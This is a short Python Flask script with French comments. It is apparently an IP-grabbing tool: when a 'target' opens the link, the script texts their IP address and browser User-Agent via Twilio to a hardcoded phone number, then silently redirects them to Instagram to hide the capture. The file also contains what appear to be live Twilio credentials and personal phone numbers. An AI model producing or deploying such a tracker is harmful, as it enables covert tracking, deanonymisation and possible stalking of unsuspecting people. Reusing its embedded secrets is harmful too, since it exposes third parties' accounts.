import os
from flask import Flask, request, redirect
from twilio.rest import Client

# Initialisation de Flask
app = Flask(__name__)

# Variables d'environnement pour Twilio
TWILIO_ACCOUNT_SID = "AC2ef2bd5bd5146f76f586d2c577159f90"
TWILIO_AUTH_TOKEN = "ec746c04233667b9836c82d9512a9ee9"
FROM_PHONE = "+12524866318"
TO_PHONE = "+33635960569"

# Création du client Twilio
client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# Fonction pour envoyer le SMS
def send_sms(ip, user_agent):
    message = f"Nouvelle connexion:\nIP: {ip}\nUser-Agent: {user_agent}"
    client.messages.create(
        body=message,
        from_=FROM_PHONE,
        to=TO_PHONE
    )

# Route principale
@app.route("/")
def index():
    # Récupérer l'IP et User-Agent de la cible
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Envoyer l'IP et l'user-agent par SMS
    send_sms(ip_address, user_agent)

    # URL de redirection vers Instagram (tu peux la changer par l'URL de ton choix)
    redirect_url = "https://www.instagram.com"

    # Rediriger la cible
    return redirect(redirect_url)

# Lancer le serveur
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
